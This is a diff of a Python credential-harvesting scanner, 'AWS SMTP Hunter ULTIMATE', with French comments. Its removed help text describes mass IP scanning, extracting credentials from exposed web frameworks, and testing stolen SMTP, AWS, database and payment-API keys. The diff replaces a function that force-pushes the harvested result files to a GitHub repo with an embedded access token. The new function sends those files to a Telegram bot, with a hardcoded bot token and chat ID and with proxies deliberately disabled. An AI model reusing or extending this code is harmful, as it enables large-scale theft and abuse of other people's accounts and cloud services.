@@ -2869,8 +2869,8 @@ You can use these credentials for email sending.
         except Exception as e:
             self.logger.error(f"Error saving intelligence: {e}")
             
-        # Push vers GitHub
-        push_results_to_github()
+        # Envoi vers Telegram
+        send_results_to_telegram()
 
         # Stats finales
         self.print_final_comprehensive_stats()
@@ -2949,63 +2949,160 @@ You can use these credentials for email sending.
 
 # ==================== FONCTIONS UTILITAIRES ====================
 
-def push_results_to_github():
-    """🔁 Push automatique des résultats vers GitHub"""
+def send_results_to_telegram():
+    """📱 Envoi des résultats par Telegram SANS PROXY"""
     try:
-        import subprocess
-        import shutil
+        import requests
         from datetime import datetime
+        import platform
         
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        output_folder = "."
-        repo_dir = f"/tmp/github_upload_{timestamp}"
         
-        os.makedirs(repo_dir, exist_ok=True)
-        print(f"📁 Copying files to {repo_dir}")
+        # Configuration Telegram
+        TELEGRAM_BOT_TOKEN = "6611453715:AAGdZ-77M3HzHMHtHSv5_-Wgrt2tUUXhP44"  # Ton token
+        TELEGRAM_CHAT_ID = "-1002054520346"  # Tu dois le remplacer
         
-        files_copied = 0
-        for file in os.listdir(output_folder):
-            if file.endswith(".txt"):
-                shutil.copy(os.path.join(output_folder, file), os.path.join(repo_dir, file))
-                files_copied += 1
-                print(f"📄 Copied: {file}")
+        # Session sans proxy
+        session = requests.Session()
+        session.proxies = {}  # Forcer aucun proxy
+        session.trust_env = False  # Ignorer les variables d'environnement proxy
         
-        if files_copied == 0:
-            print("⚠️ No .txt files found to upload")
+        environment = "Windows"
+        print(f"🔍 Environment: {environment}")
+        print(f"📱 Sending files via Telegram (NO PROXY)...")
+        
+        files_sent = 0
+        files_found = 0
+        total_size = 0
+        
+        # Compter les fichiers d'abord
+        for filename in os.listdir("."):
+            if filename.endswith(".txt"):
+                files_found += 1
+                try:
+                    total_size += os.path.getsize(filename)
+                except:
+                    pass
+        
+        if files_found == 0:
+            print("⚠️ No .txt files found to send")
             return False
         
-        GITHUB_TOKEN = "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"
-        GITHUB_REPO = f"https://{GITHUB_TOKEN}@github.com/mehdi28777/data.git"
-        COMMIT_MESSAGE = f"Résultats scan {timestamp} - {files_copied} fichiers"
+        print(f"📊 Found {files_found} files ({total_size/1024:.1f} KB total)")
         
-        print(f"🚀 Pushing {files_copied} files to GitHub...")
-        
-        os.chdir(repo_dir)
-        
-        commands = [
-            ["git", "init"],
-            ["git", "config", "user.name", "mehdi28777"],
-            ["git", "config", "user.email", "mehdi28777@github.com"],
-            ["git", "add", "."],
-            ["git", "commit", "-m", COMMIT_MESSAGE],
-            ["git", "branch", "-M", "main"],
-            ["git", "remote", "add", "origin", GITHUB_REPO],
-            ["git", "push", "--force", "-u", "origin", "main"]
-        ]
-        
-        for cmd in commands:
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            if result.returncode != 0:
-                print(f"❌ Error executing: {' '.join(cmd)}")
-                print(f"Error: {result.stderr}")
+        # Test de connexion d'abord
+        test_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe"
+        try:
+            test_response = session.get(test_url, timeout=10)
+            if test_response.status_code == 200:
+                bot_info = test_response.json()
+                print(f"✅ Bot connection OK: {bot_info['result']['first_name']}")
+            else:
+                print(f"❌ Bot test failed: {test_response.status_code}")
                 return False
+        except Exception as e:
+            print(f"❌ Cannot connect to Telegram: {e}")
+            return False
         
-        print(f"✅ Successfully pushed {files_copied} files to GitHub!")
-        shutil.rmtree(repo_dir, ignore_errors=True)
-        return True
+        # Envoi du message de début
+        start_message = f"🔥 <b>{environment} Scan Results</b>\n\n"
+        start_message += f"📅 <b>Date:</b> {timestamp}\n"
+        start_message += f"📊 <b>Files found:</b> {files_found}\n"
+        start_message += f"📁 <b>Total size:</b> {total_size/1024:.1f} KB\n\n"
+        start_message += f"📤 Starting file transfer..."
         
+        start_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        start_data = {
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': start_message,
+            'parse_mode': 'HTML'
+        }
+        
+        start_response = session.post(start_url, data=start_data, timeout=15)
+        if start_response.status_code != 200:
+            print(f"❌ Failed to send start message: {start_response.status_code}")
+            print(f"Response: {start_response.text}")
+            return False
+        
+        print("✅ Start message sent")
+        
+        # Envoyer chaque fichier .txt
+        for filename in sorted(os.listdir(".")):
+            if not filename.endswith(".txt"):
+                continue
+                
+            try:
+                print(f"📤 Sending: {filename}")
+                
+                file_size = os.path.getsize(filename)
+                
+                if file_size > 50 * 1024 * 1024:  # 50MB max
+                    print(f"⚠️ File too large: {filename}")
+                    continue
+                
+                if file_size == 0:
+                    print(f"⚠️ Empty file: {filename}")
+                    continue
+                
+                # Caption
+                caption = f"📄 <b>{filename}</b>\n"
+                caption += f"🌍 <b>Source:</b> {environment}\n"
+                caption += f"📊 <b>Size:</b> {file_size/1024:.1f} KB\n"
+                caption += f"🕐 <b>Time:</b> {timestamp}"
+                
+                # Envoyer le fichier
+                send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+                
+                with open(filename, 'rb') as file:
+                    files_data = {'document': (filename, file, 'text/plain')}
+                    data = {
+                        'chat_id': TELEGRAM_CHAT_ID,
+                        'caption': caption,
+                        'parse_mode': 'HTML'
+                    }
+                    
+                    response = session.post(send_url, data=data, files=files_data, timeout=60)
+                
+                if response.status_code == 200:
+                    print(f"✅ Sent: {filename}")
+                    files_sent += 1
+                else:
+                    print(f"❌ Failed to send {filename}: {response.status_code}")
+                    print(f"Response: {response.text[:200]}")
+                    
+                # Délai anti-spam
+                import time
+                time.sleep(2)
+                        
+            except Exception as e:
+                print(f"❌ Error sending {filename}: {e}")
+                continue
+        
+        # Message de fin
+        summary_message = f"📊 <b>Transfer Complete!</b>\n\n"
+        summary_message += f"✅ <b>Files sent:</b> {files_sent}/{files_found}\n"
+        summary_message += f"📈 <b>Success rate:</b> {(files_sent/max(1,files_found)*100):.1f}%\n"
+        summary_message += f"🕐 <b>Completed:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
+        
+        if files_sent > 0:
+            summary_message += f"🎉 <b>All scan results delivered!</b>"
+        else:
+            summary_message += f"❌ <b>No files were sent successfully</b>"
+        
+        session.post(start_url, data={
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': summary_message,
+            'parse_mode': 'HTML'
+        }, timeout=15)
+        
+        print(f"\n📊 TELEGRAM UPLOAD SUMMARY:")
+        print(f"   Files sent:     {files_sent}/{files_found}")
+        print(f"   Success rate:   {(files_sent/max(1,files_found)*100):.1f}%")
+        
+        return files_sent > 0
+            
     except Exception as e:
-        print(f"❌ Error pushing to GitHub: {e}")
+        print(f"❌ Critical error in Telegram upload: {e}")
         return False
 
 def setup_signal_handlers(hunter):
@@ -3077,26 +3174,6 @@ def show_interactive_menu():
     print("   2. RANDOM   - Pure random generation for maximum coverage")
     print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
     print()
-    print("⚡ FEATURES INCLUDED:")
-    print("   • Async + Multi-threading for maximum performance")
-    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
-    print("   • Complete credential extraction and exploitation")
-    print("   • Live SMTP testing with real email sending")
-    print("   • AWS credentials testing with service quotas")
-    print("   • Database connection testing (MySQL, PostgreSQL)")
-    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
-    print("   • Intelligent learning and adaptation")
-    print("   • Advanced performance monitoring")
-    print("   • Automatic cleanup and optimization")
-    print("   • Comprehensive logging and reporting")
-    print()
-    print("🔧 PERFORMANCE OPTIMIZATIONS:")
-    print("   • Adaptive delays (0.01-0.1s)")
-    print("   • Intelligent queue management")
-    print("   • Memory optimization and cleanup")
-    print("   • CPU usage monitoring and adjustment")
-    print("   • Network optimization")
-    print()
     
     while True:
         try:
@@ -3165,86 +3242,18 @@ def parse_command_line_arguments():
     """📋 Parsing des arguments CLI ultra-complet"""
     parser = argparse.ArgumentParser(
         description="🔥 AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-🔥 EXAMPLES:
-  python hunter.py                                    # Interactive mode
-  python hunter.py --mode hybrid --threads 1000      # Quick start
-  python hunter.py --mode smart --threads 2000 --email your@email.com --debug
-  
-🎯 MODES:
-  smart   : Intelligent targeting of productive IP ranges
-  random  : Pure random generation for maximum coverage  
-  hybrid  : Combination of smart + random (70/30 split)
-  
-⚡ PERFORMANCE:
-  • Recommended threads: 1000-2000 for optimal performance
-  • Higher thread counts require more system resources
-  • Async mode automatically enabled if aiohttp available
-  
-📧 FEATURES:
-  • Real-time SMTP testing with email sending
-  • AWS credentials validation with service analysis
-  • Database connection testing (MySQL, PostgreSQL)
-  • API testing (Twilio, Stripe, SendGrid, Mailgun)
-  • Framework detection (Laravel, Symfony, Django, etc.)
-  • Intelligent learning and performance adaptation
-        """
+        formatter_class=argparse.RawDescriptionHelpFormatter
     )
     
-    parser.add_argument(
-        '--mode', '-m',
-        choices=['smart', 'random', 'hybrid'],
-        help='IP generation mode (default: interactive)'
-    )
-    
-    parser.add_argument(
-        '--threads', '-t',
-        type=int,
-        help='Number of threads (default: auto-detect, max: 5000)'
-    )
-    
-    parser.add_argument(
-        '--email', '-e',
-        type=str,
-        help='Test email for SMTP validation (default: test@example.com)'
-    )
-    
-    parser.add_argument(
-        '--debug', '-d',
-        action='store_true',
-        help='Enable debug mode with verbose logging'
-    )
-    
-    parser.add_argument(
-        '--output-dir', '-o',
-        type=str,
-        help='Output directory for results (default: current directory)'
-    )
-    
-    parser.add_argument(
-        '--config',
-        type=str,
-        help='Load configuration from JSON file'
-    )
-    
-    parser.add_argument(
-        '--version', '-v',
-        action='version',
-        version='AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition'
-    )
-    
-    parser.add_argument(
-        '--quiet', '-q',
-        action='store_true',
-        help='Quiet mode - minimal output'
-    )
-    
-    parser.add_argument(
-        '--no-async',
-        action='store_true',
-        help='Disable async mode (force sync only)'
-    )
+    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'])
+    parser.add_argument('--threads', '-t', type=int)
+    parser.add_argument('--email', '-e', type=str)
+    parser.add_argument('--debug', '-d', action='store_true')
+    parser.add_argument('--output-dir', '-o', type=str)
+    parser.add_argument('--config', type=str)
+    parser.add_argument('--version', '-v', action='version', version='AWS SMTP Hunter ULTIMATE v5.0')
+    parser.add_argument('--quiet', '-q', action='store_true')
+    parser.add_argument('--no-async', action='store_true')
     
     return parser.parse_args()
 
@@ -3268,21 +3277,15 @@ def validate_configuration(mode, threads, email, debug):
     """✅ Validation de la configuration"""
     errors = []
     
-    # Validation mode
     if mode not in ['smart', 'random', 'hybrid']:
         errors.append(f"Invalid mode: {mode}")
-        
-    # Validation threads
     if not 1 <= threads <= 5000:
         errors.append(f"Threads must be between 1 and 5000, got: {threads}")
-        
-    # Validation email
     if not email or '@' not in email:
         errors.append(f"Invalid email: {email}")
         
-    # Warning for high thread count
     if threads > 3000:
-        print(f"⚠️ WARNING: {threads} threads is very high and may impact system performance")
+        print(f"⚠️ WARNING: {threads} threads is very high")
         
     if errors:
         print("❌ Configuration errors:")
@@ -3307,7 +3310,6 @@ def main():
     
     # Configuration
     if args.config:
-        # Chargement depuis fichier
         config = load_configuration_file(args.config)
         if not config:
             sys.exit(1)
@@ -3316,13 +3318,11 @@ def main():
         email = config['email']
         debug = config['debug']
     elif args.mode and args.threads and args.email:
-        # Configuration via CLI
         mode = args.mode
         threads = args.threads
         email = args.email
         debug = args.debug
     else:
-        # Configuration interactive
         mode = show_interactive_menu()
         threads, email, debug = get_advanced_configuration()
     
@@ -3362,9 +3362,7 @@ def main():
         print(f"   Threads:           {threads}")
         print(f"   Test Email:        {email}")
         print(f"   Debug Mode:        {debug}")
-        print(f"   Async Available:   {AIOHTTP_AVAILABLE}")
-        print(f"   Output Directory:  {os.getcwd()}")
-        print(f"   Quiet Mode:        {args.quiet}")
+        print(f"   Telegram API:      ✅ Enabled")
     
     # Création du hunter
     try:
@@ -3381,10 +3379,6 @@ def main():
         # Confirmation finale si interactif
         if not args.mode and not args.quiet:
             print(f"\n🚀 READY TO START COMPLETE SCAN!")
-            print(f"   This will use {threads} threads for maximum performance")
-            print(f"   All credentials found will be tested and verified")
-            print(f"   Results will be saved in multiple output files")
-            print(f"   Real-time monitoring and adaptation enabled")
             input("\n🚀 Press Enter to start the complete scan...")
         
         # Lancement du scan complet
